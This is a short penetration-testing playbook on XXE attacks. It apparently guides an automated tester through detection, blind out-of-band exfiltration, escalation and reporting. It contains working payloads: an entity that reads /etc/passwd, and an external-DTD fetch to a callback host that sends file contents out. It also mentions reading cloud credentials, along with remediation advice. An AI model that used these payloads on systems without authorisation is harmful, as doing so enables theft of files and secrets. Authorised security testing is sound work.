# Playbook: XXE (XML External Entity)

Where XML is parsed server-side: SOAP APIs, SAML, `Content-Type: application/xml`
endpoints, SVG/DOCX/XLSX/PDF uploads (all zip+XML under the hood), RSS/sitemap
importers, and any legacy "upload config as XML" feature.

## Detect
1. Find an endpoint that accepts XML (or a file format that wraps XML).
2. Baseline it: send valid XML, confirm it's parsed (values reflected, or an
   XML-specific error).
3. **In-band leak** — declare an entity and reference it:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
   <root><name>&x;</name></root>
   ```
   `root:x:0:0` in the response = classic XXE.

## Blind XXE (no reflection) — use interactsh

Most modern parsers don't echo. Prove it out-of-band:
1. `oob_start()` for a callback domain.
2. Force an external DTD fetch:
   ```xml
   <!DOCTYPE r [<!ENTITY % ext SYSTEM "http://<callback>/e.dtd"> %ext;]>
   ```
   Host `e.dtd` on your server with an exfil parameter entity that sends file
   contents back to the callback (OOB exfiltration DTD).
3. `oob_poll()` — a callback confirms blind XXE; the query string carries the
   exfiltrated data.

## Escalation
- File read (`/etc/passwd`, source, config with secrets, cloud creds).
- SSRF -> internal services / cloud metadata (chain into the SSRF playbook).
- `expect://`, `php://filter` (base64 source read) on PHP.
- Billion-laughs / entity expansion = DoS — mention as risk, don't fire it at a
  live target.

## Report
Show the payload + the leaked file (or OOB callback). Remediation: disable DOCTYPE
/ external entities in the parser (the one-line fix for most stacks), prefer a
non-XML format, patch the library.
